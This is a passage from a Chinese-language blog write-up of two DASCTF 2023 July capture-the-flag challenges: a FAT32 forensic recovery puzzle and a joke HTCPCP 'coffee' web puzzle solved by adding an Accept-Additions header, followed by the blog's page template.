+<h2 id="ezfat32">ezFAT32</h2>
+<p>用取证大师FAT32恢复，导出那个bmp，算hash解压压缩包即可</p>
+<h2 id="coffee-desu">Coffee desu!</h2>
+<p>题目要求You should add the milktea before getting the coffee!</p>
+<p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230802212714661.png" alt="image-20230802212714661"></p>
+<p>查阅资料</p>
+<p><a href="https://datatracker.ietf.org/doc/html/rfc2324">RFC 2324 - Hyper Text Coffee Pot Control Protocol (HTCPCP/1.0) (ietf.org)</a></p>
+<p>那么加个头即可：</p>
+<p><code>Accept-Additions: milktea</code></p>
+<p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230802212629296.png" alt="image-20230802212629296"></p>
+<p><code>GET</code>请求一下就可以拿到flag</p>
+<p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230802212825016.png" alt="image-20230802212825016"></p>
+              
+
+
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/wp/">wp</a>
+
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/2023/">2023</a>
+
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/misc/">misc</a>
+
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/web/">web</a>
+
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/dasctf/">dasctf</a>
+
+                  </div>
+                
+              
+            
+            
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/2023_ctf/" data-tooltip="【2023 *ctf】 MISC&amp;WEB" aria-label="上一篇: 【2023 *ctf】 MISC&amp;WEB">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/dasctf-2023-0x401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/" title="分享到 Facebook" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/dasctf-2023-0x401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/" title="分享到 Twitter" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/dasctf-2023-0x401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+            
+  
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https:\/\/gkjzjh146.github.io\/post\/dasctf-2023-0x401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B\/';
+        
+          this.page.identifier = '\/post\/dasctf-2023-0x401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B\/'
+        
+      };
+      (function() {
+        
+        
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+          return;
+        }
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = 'hugo-tranquilpeak-theme';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+  
+
+
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2023 gkjzjh146. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/2023_ctf/" data-tooltip="【2023 *ctf】 MISC&amp;WEB" aria-label="上一篇: 【2023 *ctf】 MISC&amp;WEB">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/dasctf-2023-0x401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/" title="分享到 Facebook" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/dasctf-2023-0x401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/" title="分享到 Twitter" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/dasctf-2023-0x401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+      </div>
+      
+<div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-times"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2Fdasctf-2023-0x401%25E4%25B8%2583%25E6%259C%2588%25E6%259A%2591%25E6%259C%259F%25E6%258C%2591%25E6%2588%2598%25E8%25B5%259B%2F" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i><span>分享到 Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2Fdasctf-2023-0x401%25E4%25B8%2583%25E6%259C%2588%25E6%259A%2591%25E6%259C%259F%25E6%258C%2591%25E6%2588%2598%25E8%25B5%259B%2F" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2Fdasctf-2023-0x401%25E4%25B8%2583%25E6%259C%2588%25E6%259A%2591%25E6%259C%259F%25E6%258C%2591%25E6%2588%2598%25E8%25B5%259B%2F" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i><span>分享到 Linkedin</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-times"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+    
+    <h4 id="about-card-name">gkjzjh146</h4>
+    
+      <div id="about-card-bio">会点web，会点misc</div>
+    
+    
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://gkjzjh146.github.io/images/3.jpeg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script src="https://gkjzjh146.github.io/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
+  
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+
+
+    
+  </body>
+</html>
+
